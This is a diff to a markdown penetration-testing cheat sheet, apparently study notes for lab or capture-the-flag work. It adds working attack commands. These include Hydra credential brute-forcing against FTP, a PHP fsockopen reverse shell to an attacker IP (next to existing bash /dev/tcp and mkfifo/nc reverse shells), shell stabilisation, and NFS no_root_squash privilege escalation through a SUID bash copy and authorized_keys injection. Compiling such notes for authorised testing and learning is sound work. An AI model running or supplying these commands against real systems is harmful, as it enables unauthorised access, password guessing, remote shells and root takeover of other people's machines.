@@ -139,6 +139,11 @@ hydra — SSH
 hydra -l <user> -P ./Passwords/Leaked-Databases/rockyou.txt -t 4 -v -f <ip> ssh
 ```
 
+hydra — FTP with credential list
+```bash
+hydra -L user.txt -P pw.txt ftp://<ip> -t 4 -vV -f
+```
+
 medusa
 ```bash
 medusa -h <ip> -u admin -P ./Passwords/Common-Credentials/10k-most-common.txt -M http -m DIR:/ -v 6
@@ -222,6 +227,12 @@ export TERM=xterm
 stty rows 62 cols 149
 ```
 
+Fallback when Python is not available
+```bash
+script /dev/null -c bash
+# Then Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+```
+
 ---
 
 ## 🔗 Make All Necessary Symlinks
@@ -258,6 +269,11 @@ bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'
 mkfifo reverse shell (works without bash)
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 4444 >/tmp/f
+```
+
+PHP fsockopen reverse shell (useful when exec/system functions are available)
+```php
+php -r '$sock=fsockopen("<ip>",4444);exec("/bin/sh <&3 >&3 2>&3");'
 ```
 
 Python reverse shell (useful for RATs/REPLs)
@@ -329,6 +345,12 @@ gpg --import private.asc   # enter cracked passphrase
 gpg --decrypt backup.pgp
 ```
 
+Decrypt .gpg file directly (key already imported)
+```bash
+gpg --decrypt file.xlsx.gpg > file.xlsx
+# If key is expired, decryption still works — gpg will warn but proceed
+```
+
 ---
 
 ## 📁 FTP Enumeration
@@ -345,7 +367,9 @@ Useful FTP commands
 ```bash
 ftp> ls -lah          # list with hidden files
 ftp> cd <dir>
+ftp> cd ..            # go up — useful if webroot subdir is write-protected
 ftp> get <file>
+ftp> put <file>       # upload file
 ftp> prompt off       # disable transfer prompts
 ftp> mget *           # download all files
 ```
@@ -635,17 +659,54 @@ smb: \> mget *
 
 ---
 
-## 📂 NFS Enumeration
+## 📂 NFS Enumeration & Exploitation
 
 Show exports
 ```bash
 showmount -e <ip>
 ```
 
-Mount export
+Mount export (direct)
 ```bash
-mount -t nfs <ip>:/opt/conf /tmp/nfs
+sudo mount -t nfs <ip>:/opt/conf /tmp/nfs
 ls -la /tmp/nfs
+```
+
+Mount internal NFS via SSH tunnel (port not exposed externally)
+```bash
+# Step 1 — forward local 2049 to target's NFS
+ssh -i id_rsa -L 2049:localhost:2049 <user>@<ip>
+
+# Step 2 — mount as root on attacker (separate terminal)
+sudo mount -t nfs -o port=2049,nolock,nfsvers=4 127.0.0.1:/ /tmp/nfs
+```
+
+Check for no_root_squash
+```bash
+cat /etc/exports
+# Look for: no_root_squash
+# This means attacker root retains UID 0 on the mount
+```
+
+NFS no_root_squash — SUID bash privesc
+```bash
+# On target as low-priv user — copy native bash into NFS-exported dir
+cp /bin/bash /home/<user>/
+
+# On attacker as root — set SUID via NFS mount
+chown root:root /tmp/nfs/bash
+chmod +s /tmp/nfs/bash
+
+# On target as low-priv user — execute
+./bash -p
+# euid=0(root)
+```
+
+NFS no_root_squash — SSH key injection
+```bash
+# On attacker as root — write directly into user's .ssh via NFS mount
+echo '<pubkey>' >> /tmp/nfs/.ssh/authorized_keys
+# Then SSH in as that user
 ```
 
 ---
